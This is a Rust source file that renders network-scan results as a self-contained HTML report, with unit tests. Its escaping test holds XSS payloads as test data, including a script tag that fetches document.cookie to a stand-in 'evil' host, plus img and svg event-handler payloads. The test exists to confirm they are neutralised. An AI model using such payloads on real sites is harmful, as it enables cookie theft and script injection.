//! A discovery report as a single HTML file.
//!
//! Meant to be handed to someone else — a person who knows networks better, a
//! landlord, an IT department — or kept as a dated snapshot of what the
//! network looked like. So it is self-contained: no scripts, no stylesheets,
//! no fonts fetched from anywhere, and it opens from a file:// path with no
//! network at all.
//!
//! Everything that came from a device is escaped on the way in. Hostnames,
//! vendor names, mDNS names and user labels are all strings a device or a
//! person chose, and a report about a hostile device must not be the thing
//! that runs its code.

use crate::discovery::{is_private_mac, is_trusted, relative_age, DiscoveryContext};
use netgap_core::{html::escape, Device};

/// Render a discovery run as a standalone HTML document.
pub fn format_discovery_html(devices: &[Device], context: &DiscoveryContext<'_>) -> String {
    let mut html = String::with_capacity(16 * 1024);

    let trusted: Vec<&Device> = devices
        .iter()
        .filter(|device| is_trusted(device, context.trusted))
        .collect();
    let unrecognized = devices.len() - trusted.len();
    let new_devices: Vec<&Device> = devices
        .iter()
        .filter(|device| device.first_seen.is_none())
        .collect();
    let randomized = devices
        .iter()
        .filter(|device| device.mac.as_deref().is_some_and(is_private_mac))
        .count();

    html.push_str("<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n");
    html.push_str("<meta charset=\"utf-8\">\n");
    html.push_str("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n");
    html.push_str(&format!(
        "<title>Network devices — {}</title>\n",
        escape(&generated_on())
    ));
    html.push_str(STYLE);
    html.push_str("</head>\n<body>\n<main>\n");

    html.push_str("<header>\n");
    html.push_str("  <h1>Devices on this network</h1>\n");
    html.push_str(&format!(
        "  <p class=\"when\">Scanned {}</p>\n",
        escape(&generated_on())
    ));
    html.push_str("</header>\n");

    // What was scanned, and how. The method matters to anyone reading this
    // later: an ARP sweep and a TCP sweep do not find the same set of devices.
    html.push_str("<section class=\"run\">\n<dl>\n");
    for (term, value) in [
        ("Network", context.target.to_string()),
        ("Interface", context.interface.to_string()),
        ("Devices found", devices.len().to_string()),
    ] {
        html.push_str(&format!(
            "  <div><dt>{}</dt><dd>{}</dd></div>\n",
            escape(term),
            escape(&value)
        ));
    }
    html.push_str("</dl>\n</section>\n");

    // The conclusion, in the same words the terminal report uses.
    html.push_str("<section class=\"tally\">\n");
    html.push_str(&format!(
        "<p class=\"count\">{} device{}</p>\n",
        devices.len(),
        if devices.len() == 1 { "" } else { "s" }
    ));
    html.push_str("<ul>\n");
    html.push_str(&format!(
        "<li><span class=\"ok\">{}</span> recognized</li>\n",
        trusted.len()
    ));
    html.push_str(&format!(
        "<li><span class=\"{}\">{}</span> not recognized</li>\n",
        if unrecognized > 0 { "warn" } else { "ok" },
        unrecognized
    ));
    if !new_devices.is_empty() {
        html.push_str(&format!(
            "<li><span class=\"warn\">{}</span> not seen in an earlier scan</li>\n",
            new_devices.len()
        ));
    }
    if randomized > 0 {
        html.push_str(&format!(
            "<li><span class=\"muted\">{randomized}</span> using a private (randomized) address</li>\n"
        ));
    }
    html.push_str("</ul>\n");

    // The reader may not know that "not recognized" is not "intruder".
    html.push_str(
        "<p class=\"note\">A device that is not recognized is not necessarily unwelcome — it \
         may be a guest, or a phone whose address changed. Only you can say which devices \
         belong here.</p>\n",
    );
    html.push_str("</section>\n");

    if devices.is_empty() {
        html.push_str(
            "<section class=\"empty\"><p>No devices answered. Check the network range, or run \
             again with sudo for a fuller sweep.</p></section>\n",
        );
        html.push_str("</main>\n</body>\n</html>\n");
        return html;
    }

    html.push_str("<section>\n<h2>Devices</h2>\n");
    html.push_str("<table>\n<thead>\n<tr>\n");
    for heading in [
        "Address",
        "Name",
        "Hardware address",
        "Vendor",
        "What it appears to be",
        "First seen",
        "Status",
    ] {
        html.push_str(&format!("  <th>{}</th>\n", escape(heading)));
    }
    html.push_str("</tr>\n</thead>\n<tbody>\n");

    for device in devices {
        let recognized = is_trusted(device, context.trusted);
        let mac = device.mac.clone().unwrap_or_default();
        let randomized_mac = is_private_mac(&mac);

        html.push_str("<tr>\n");
        html.push_str(&format!(
            "  <td class=\"addr\">{}</td>\n",
            escape(&device.ip.to_string())
        ));

        let name = device
            .hostname
            .clone()
            .or_else(|| {
                device
                    .mac
                    .as_ref()
                    .and_then(|mac| context.labels.get(mac).cloned())
            })
            .unwrap_or_default();
        html.push_str(&format!(
            "  <td>{}</td>\n",
            if name.is_empty() {
                "<span class=\"muted\">—</span>".to_string()
            } else {
                escape(&name)
            }
        ));

        html.push_str(&format!(
            "  <td class=\"addr\">{}{}</td>\n",
            if mac.is_empty() {
                "<span class=\"muted\">—</span>".to_string()
            } else {
                escape(&mac)
            },
            if randomized_mac {
                " <span class=\"muted\">(private)</span>"
            } else {
                ""
            }
        ));

        html.push_str(&format!("  <td>{}</td>\n", cell(device.vendor.as_deref())));
        html.push_str(&format!(
            "  <td>{}</td>\n",
            cell(device.device_type.as_deref())
        ));
        html.push_str(&format!("  <td>{}</td>\n", escape(&seen_text(device))));
        html.push_str(&format!(
            "  <td>{}</td>\n",
            if recognized {
                "<span class=\"ok\">recognized</span>".to_string()
            } else {
                "<span class=\"warn\">not recognized</span>".to_string()
            }
        ));
        html.push_str("</tr>\n");

        // IPv6 addresses get their own row: they are long, they are often
        // link-local, and squeezing them into the address column would push
        // everything else off the page.
        for address in &device.ipv6_addresses {
            let link_local = address
                .parse::<std::net::Ipv6Addr>()
                .map(|address| (address.segments()[0] & 0xffc0) == 0xfe80)
                .unwrap_or(false);

            html.push_str(&format!(
                "<tr class=\"secondary\">\n  <td class=\"addr\">{}</td>\n  <td colspan=\"6\">{}</td>\n</tr>\n",
                escape(address),
                if link_local {
                    "link-local address — reachable on this network only"
                } else {
                    "IPv6 address"
                }
            ));
        }
    }

    html.push_str("</tbody>\n</table>\n</section>\n");

    html.push_str(
        "<footer>\n<p>Types are inferred from network position, open ports, hardware address and \
         name — treat them as hints, not facts. A device using a private address has randomized \
         it for privacy, so it has no manufacturer to look up.</p>\n</footer>\n",
    );

    html.push_str("</main>\n</body>\n</html>\n");
    html
}

/// An empty cell reads as a dash rather than a blank.
fn cell(value: Option<&str>) -> String {
    match value {
        Some(value) if !value.trim().is_empty() => escape(value),
        _ => "<span class=\"muted\">—</span>".to_string(),
    }
}

/// When a device was first seen, in words rather than a timestamp.
fn seen_text(device: &Device) -> String {
    match device.first_seen.as_deref() {
        None => "first time this scan".to_string(),
        Some(first_seen) => match relative_age(first_seen) {
            Some(age) => format!("{age} ago"),
            None => first_seen.to_string(),
        },
    }
}

/// The scan's date, in the reader's own timezone.
fn generated_on() -> String {
    chrono::Local::now().format("%-d %B %Y, %H:%M").to_string()
}

/// Stylesheet, inline so the file needs nothing from the network.
///
/// Colours are chosen to survive being printed in black and white, and the
/// layout collapses to one column on a phone, which is where a report someone
/// was sent is likely to be opened.
const STYLE: &str = r#"<style>
:root {
  --ink: #1c1c1e;
  --muted: #6b6b70;
  --line: #d8d8dd;
  --ok: #1a7f37;
  --warn: #b3261e;
  --paper: #ffffff;
  --wash: #f6f6f8;
}
@media (prefers-color-scheme: dark) {
  :root {
    --ink: #e8e8ea;
    --muted: #9a9aa0;
    --line: #3a3a3e;
    --ok: #4ac26b;
    --warn: #ff8a80;
    --paper: #16161a;
    --wash: #1e1e22;
  }
}
* { box-sizing: border-box; }
body {
  margin: 0;
  padding: 2rem 1rem;
  background: var(--wash);
  color: var(--ink);
  font: 16px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
main { max-width: 60rem; margin: 0 auto; }
header h1 { margin: 0 0 .25rem; font-size: 1.6rem; letter-spacing: -.01em; }
.when { margin: 0 0 1.5rem; color: var(--muted); }
section {
  background: var(--paper);
  border: 1px solid var(--line);
  border-radius: 10px;
  padding: 1.25rem;
  margin-bottom: 1.25rem;
}
.run dl { display: flex; flex-wrap: wrap; gap: 1.5rem; margin: 0; }
.run div { display: flex; flex-direction: column; }
.run dt { color: var(--muted); font-size: .8rem; text-transform: uppercase; letter-spacing: .04em; }
.run dd { margin: .15rem 0 0; font-weight: 600; }
.tally .count { font-size: 1.5rem; font-weight: 700; margin: 0 0 .5rem; }
.tally ul { list-style: none; padding: 0; margin: 0 0 .75rem; display: flex; flex-wrap: wrap; gap: 1.25rem; }
.tally li { display: flex; gap: .4rem; align-items: baseline; }
.tally .ok, .ok { color: var(--ok); font-weight: 600; }
.tally .warn, .warn { color: var(--warn); font-weight: 600; }
.muted { color: var(--muted); }
.note { color: var(--muted); margin: 0; font-size: .92rem; max-width: 48rem; }
h2 { margin: 0 0 .75rem; font-size: 1.1rem; }
table { width: 100%; border-collapse: collapse; font-size: .93rem; }
th { text-align: left; color: var(--muted); font-size: .78rem; text-transform: uppercase; letter-spacing: .04em; padding: 0 .6rem .5rem 0; border-bottom: 1px solid var(--line); }
td { padding: .55rem .6rem .55rem 0; border-bottom: 1px solid var(--line); vertical-align: top; }
tbody tr:last-child td { border-bottom: none; }
.addr { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; white-space: nowrap; }
tr.secondary td { padding-top: 0; border-bottom: none; color: var(--muted); font-size: .85rem; }
.empty p { margin: 0; color: var(--muted); }
footer { color: var(--muted); font-size: .88rem; padding: 0 .25rem 2rem; }
footer p { margin: 0; max-width: 48rem; }
@media (max-width: 44rem) {
  body { padding: 1rem .6rem; }
  section { padding: 1rem; }
  table, thead, tbody, tr, td, th { display: block; }
  thead { display: none; }
  tr { border-bottom: 1px solid var(--line); padding: .6rem 0; }
  td { border: none; padding: .1rem 0; }
  td:empty { display: none; }
}
@media print {
  body { background: #fff; padding: 0; }
  section { border: none; border-bottom: 1px solid #ccc; border-radius: 0; padding: 0 0 .8rem; }
  tr { break-inside: avoid; }
}
</style>
"#;

#[cfg(test)]
mod tests {
    use super::*;
    use netgap_core::Device;
    use std::collections::HashMap;

    fn context<'a>(
        trusted: &'a std::collections::HashSet<String>,
        labels: &'a HashMap<String, String>,
    ) -> DiscoveryContext<'a> {
        DiscoveryContext {
            interface: "wlan0",
            target: "192.168.111.0/24",
            trusted,
            labels,
            gateway: None,
            local: None,
        }
    }

    fn device(ip: &str, mac: &str) -> Device {
        let mut device = Device::new(ip.parse().expect("a valid address"));
        device.mac = Some(mac.to_string());
        device
    }

    #[test]
    fn test_a_report_renders_its_devices() {
        let trusted = std::collections::HashSet::new();
        let labels = HashMap::new();
        let mut net = device("192.168.111.1", "C4:B2:5B:0A:03:26");
        net.vendor = Some("Ruijie Networks".to_string());
        net.device_type = Some("Router / gateway".to_string());

        let html = format_discovery_html(&[net], &context(&trusted, &labels));

        assert!(html.starts_with("<!DOCTYPE html>"));
        assert!(html.contains("Ruijie Networks"));
        assert!(html.contains("192.168.111.0/24"));
        assert!(html.contains("C4:B2:5B:0A:03:26"));
        assert!(html.trim_end().ends_with("</html>"));
    }

    /// The whole point of escaping: a device names itself, and the report is
    /// read by someone else.
    #[test]
    fn test_a_hostile_name_cannot_become_script() {
        let trusted = std::collections::HashSet::new();
        let labels = HashMap::new();
        let mut hostile = device("192.168.111.66", "AA:BB:CC:DD:EE:FF");
        hostile.hostname =
            Some("<script>fetch('http://evil/'+document.cookie)</script>".to_string());
        hostile.vendor = Some("\"><img src=x onerror=alert(1)>".to_string());
        hostile.device_type = Some("<svg onload=alert(2)>".to_string());

        let html = format_discovery_html(&[hostile], &context(&trusted, &labels));

        // The words survive as text — that is fine and even useful, the
        // reader should see what the device called itself. What must not
        // survive is anything the browser would treat as markup.
        assert!(!html.contains("<script"), "script tag survived escaping");
        assert!(!html.contains("<img"), "img tag survived escaping");
        assert!(!html.contains("<svg"), "svg tag survived escaping");
        assert!(!html.contains("<b>"), "bold tag survived escaping");
        assert!(
            html.contains("&lt;script&gt;"),
            "the name should still be readable as text"
        );
    }

    /// A user's own label goes through the same escaping as a device's claim.
    #[test]
    fn test_a_label_is_escaped_too() {
        let trusted = std::collections::HashSet::new();
        let mut labels = HashMap::new();
        labels.insert(
            "AA:BB:CC:DD:EE:FF".to_string(),
            "<b>my laptop</b>".to_string(),
        );

        let html = format_discovery_html(
            &[device("192.168.111.10", "AA:BB:CC:DD:EE:FF")],
            &context(&trusted, &labels),
        );

        assert!(html.contains("&lt;b&gt;my laptop&lt;/b&gt;"));
        assert!(!html.contains("<b>my laptop</b>"));
    }

    #[test]
    fn test_ipv6_addresses_get_their_own_row() {
        let trusted = std::collections::HashSet::new();
        let labels = HashMap::new();
        let mut device = device("192.168.111.1", "C4:B2:5B:0A:03:26");
        device.ipv6_addresses = vec!["fe80::c6b2:5bff:fe0a:326".to_string()];

        let html = format_discovery_html(&[device], &context(&trusted, &labels));

        assert!(html.contains("fe80::c6b2:5bff:fe0a:326"));
        assert!(html.contains("link-local"));
    }

    #[test]
    fn test_trusted_devices_are_marked_as_such() {
        let mut trusted = std::collections::HashSet::new();
        trusted.insert("C4:B2:5B:0A:03:26".to_string());
        let labels = HashMap::new();

        let html = format_discovery_html(
            &[device("192.168.111.1", "C4:B2:5B:0A:03:26")],
            &context(&trusted, &labels),
        );

        // Checked on the status cell rather than the whole document: the
        // standing note explains what "not recognized" means, so the words
        // appear either way.
        assert!(html.contains("<span class=\"ok\">recognized</span>"));
        assert!(!html.contains("<span class=\"warn\">not recognized</span>"));
    }

    /// Nothing may be fetched from the network: the report has to open from a
    /// file, on a machine that may not be online.
    #[test]
    fn test_the_document_is_self_contained() {
        let trusted = std::collections::HashSet::new();
        let labels = HashMap::new();

        let html = format_discovery_html(
            &[device("192.168.111.1", "C4:B2:5B:0A:03:26")],
            &context(&trusted, &labels),
        );

        assert!(!html.contains("<script"));
        assert!(!html.contains("http://"));
        assert!(!html.contains("https://"));
        assert!(!html.contains("<link"));
    }

    #[test]
    fn test_an_empty_network_says_so() {
        let trusted = std::collections::HashSet::new();
        let labels = HashMap::new();

        let html = format_discovery_html(&[], &context(&trusted, &labels));

        assert!(html.contains("No devices answered"));
        assert!(html.trim_end().ends_with("</html>"));
    }
}
